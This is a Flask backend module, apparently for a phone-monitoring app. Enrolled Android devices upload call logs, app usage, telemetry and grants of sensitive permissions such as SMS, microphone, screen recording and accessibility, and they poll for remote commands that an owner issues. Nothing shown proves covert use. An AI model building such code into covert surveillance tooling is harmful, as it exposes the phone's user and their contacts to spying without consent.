from flask import Blueprint, request, jsonify
from backend.auth import token_required
from database import supabase
from datetime import datetime
import uuid

devices_bp = Blueprint('devices', __name__)

def verify_device_access(owner_id, device_id):
    check = supabase.table('devices').select('id').eq('id', device_id).eq('owner_id', owner_id).execute()
    return len(check.data) > 0

@devices_bp.route('/api/devices', methods=['GET'])
@token_required
def get_devices():
    try:
        response = supabase.table('devices').select('*').eq('owner_id', request.owner_id).execute()
        return jsonify({"status": "success", "data": response.data}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@devices_bp.route('/api/devices/connect', methods=['POST'])
@token_required
def connect_device():
    data = request.json or {}
    device_uid = data.get('device_id')
    name = data.get('name')
    model = data.get('model', 'Unknown Phone')

    if not device_uid or not name:
        return jsonify({"status": "error", "message": "Parameters device_id and name are required"}), 400

    try:
        existing = supabase.table('devices').select('*').eq('device_id', device_uid).execute()
        new_device_token = str(uuid.uuid4())
        
        device_payload = {
            "name": name,
            "model": model,
            "android_version": data.get('android_version', 'N/A'),
            "app_version": data.get('app_version', '1.0.0'),
            "owner_id": request.owner_id,
            "online_status": True,
            "last_seen": datetime.utcnow().isoformat(),
            "battery_level": data.get('battery_level', 100),
            "is_charging": data.get('is_charging', False),
            "network_type": data.get('network_type', 'WIFI'),
            "storage_used": data.get('storage_used', '0%'),
            "temperature": data.get('temperature', 30.0),
            "device_token": new_device_token
        }

        if existing.data:
            dev_id = existing.data[0]['id']
            response = supabase.table('devices').update(device_payload).eq('id', dev_id).execute()
            
            supabase.table('activity_logs').insert({
                "device_id": dev_id,
                "event_type": "Device Reconnected",
                "description": f"Context re-established for {model}"
            }).execute()
        else:
            device_payload["device_id"] = device_uid
            response = supabase.table('devices').insert(device_payload).execute()
            dev_id = response.data[0]['id']

            supabase.table('permissions').insert({"device_id": dev_id}).execute()
            
            supabase.table('activity_logs').insert({
                "device_id": dev_id,
                "event_type": "Device Connected",
                "description": f"First system authorization completed for device model {model}"
            }).execute()

        return jsonify({"status": "success", "data": response.data[0]}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@devices_bp.route('/api/devices/status', methods=['POST'])
def update_status():
    token = request.headers.get('X-Device-Token')
    if not token:
        return jsonify({"status": "error", "message": "Missing authorization handshake token"}), 401

    try:
        device_check = supabase.table('devices').select('id').eq('device_token', token).execute()
        if not device_check.data:
            return jsonify({"status": "error", "message": "Device not authenticated"}), 403

        dev_id = device_check.data[0]['id']
        data = request.json or {}

        update_payload = {
            "online_status": True,
            "last_seen": datetime.utcnow().isoformat(),
            "battery_level": data.get('battery_level', 100),
            "is_charging": data.get('is_charging', False),
            "network_type": data.get('network_type', 'WIFI'),
            "storage_used": data.get('storage_used', '0%'),
            "temperature": data.get('temperature', 30.0)
        }

        supabase.table('devices').update(update_payload).eq('id', dev_id).execute()
        return jsonify({"status": "success", "message": "Telemetry metrics written successfully"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@devices_bp.route('/api/permissions', methods=['POST'])
def sync_permissions():
    token = request.headers.get('X-Device-Token')
    if not token:
        return jsonify({"status": "error", "message": "Missing device token"}), 401

    try:
        device_check = supabase.table('devices').select('id').eq('device_token', token).execute()
        if not device_check.data:
            return jsonify({"status": "error", "message": "Device not authenticated"}), 403

        dev_id = device_check.data[0]['id']
        data = request.json or {}

        permission_payload = {
            "notification_access": data.get('notification_access', False),
            "location": data.get('location', False),
            "camera": data.get('camera', False),
            "microphone": data.get('microphone', False),
            "phone": data.get('phone', False),
            "call_log": data.get('call_log', False),
            "sms": data.get('sms', False),
            "storage": data.get('storage', False),
            "screen_recording": data.get('screen_recording', False),
            "accessibility": data.get('accessibility', False),
            "updated_at": datetime.utcnow().isoformat()
        }

        supabase.table('permissions').update(permission_payload).eq('device_id', dev_id).execute()
        return jsonify({"status": "success", "message": "Permissions synchronized successfully"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@devices_bp.route('/api/sync/calls', methods=['POST'])
def sync_calls():
    token = request.headers.get('X-Device-Token')
    if not token:
        return jsonify({"status": "error", "message": "Missing device token"}), 401
    try:
        device_check = supabase.table('devices').select('id').eq('device_token', token).execute()
        if not device_check.data:
            return jsonify({"status": "error", "message": "Device not authenticated"}), 403

        dev_id = device_check.data[0]['id']
        data = request.json or {}
        calls_list = data.get('calls', [])

        if not calls_list:
            return jsonify({"status": "success", "message": "No calls received to sync"}), 200

        bulk_payload = []
        for call in calls_list:
            bulk_payload.append({
                "device_id": dev_id,
                "type": call.get("type", "UNKNOWN"),
                "phone_number": call.get("phone_number", "Unknown"),
                "duration": call.get("duration", 0),
                "timestamp": call.get("timestamp")
            })

        supabase.table('calls').delete().eq('device_id', dev_id).execute()
        supabase.table('calls').insert(bulk_payload).execute()
        return jsonify({"status": "success", "message": f"{len(bulk_payload)} calls synchronized successfully"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# ==========================================
# 🚀 NAYE ROUTES: APP USAGE & POLLING
# ==========================================
@devices_bp.route('/api/sync/usage', methods=['POST'])
def sync_app_usage():
    token = request.headers.get('X-Device-Token')
    if not token:
        return jsonify({"status": "error", "message": "Missing device token"}), 401

    try:
        device_check = supabase.table('devices').select('id').eq('device_token', token).execute()
        if not device_check.data:
            return jsonify({"status": "error", "message": "Device not authenticated"}), 403

        dev_id = device_check.data[0]['id']
        data = request.json or {}
        usage_list = data.get('app_usage', [])

        if not usage_list:
            return jsonify({"status": "success", "message": "No usage data"}), 200

        bulk_payload = []
        for item in usage_list:
            bulk_payload.append({
                "device_id": dev_id,
                "app_name": item.get("app_name", "Unknown App"),
                "package_name": item.get("package_name", "unknown.package"),
                "time_spent": item.get("time_spent", 0)
            })
            
        supabase.table('app_usage').delete().eq('device_id', dev_id).execute()
        supabase.table('app_usage').insert(bulk_payload).execute()
        return jsonify({"status": "success", "message": "App usage synced"}), 201
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@devices_bp.route('/api/sync/commands', methods=['GET'])
def get_pending_commands():
    token = request.headers.get('X-Device-Token')
    if not token:
        return jsonify({"status": "error", "message": "Missing token"}), 401
        
    try:
        device_check = supabase.table('devices').select('id').eq('device_token', token).execute()
        if not device_check.data:
            return jsonify({"status": "error", "message": "Unauthorized"}), 403
            
        dev_id = device_check.data[0]['id']
        cmds = supabase.table('activity_logs').select('*').eq('device_id', dev_id).eq('event_type', 'Remote Action Issued').order('timestamp', desc=True).limit(5).execute()
        return jsonify({"status": "success", "commands": cmds.data}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@devices_bp.route('/api/devices/<device_id>/action', methods=['POST'])
@token_required
def execute_device_action(device_id):
    try:
        check = supabase.table('devices').select('id').eq('id', device_id).eq('owner_id', request.owner_id).execute()
        if not check.data:
            return jsonify({"status": "error", "message": "Device not found or unauthorized"}), 404

        data = request.json or {}
        action_type = data.get('action')
        if not action_type:
            return jsonify({"status": "error", "message": "Action parameter is required"}), 400

        log_desc = f"Triggered '{action_type}' command remotely."
        if 'duration' in data:
            log_desc += f" Duration: {data['duration']}s"

        supabase.table('activity_logs').insert({
            "device_id": device_id,
            "event_type": "Remote Action Issued",
            "description": log_desc
        }).execute()
        
        return jsonify({"status": "success", "message": f"Command '{action_type}' executed."}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@devices_bp.route('/api/devices/<device_id>', methods=['DELETE'])
@token_required
def remove_device(device_id):
    try:
        check = supabase.table('devices').select('id').eq('id', device_id).eq('owner_id', request.owner_id).execute()
        if not check.data:
            return jsonify({"status": "error", "message": "Device not found or unauthorized"}), 404

        supabase.table('devices').delete().eq('id', device_id).execute()
        return jsonify({"status": "success", "message": "Device removed successfully"}), 200
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
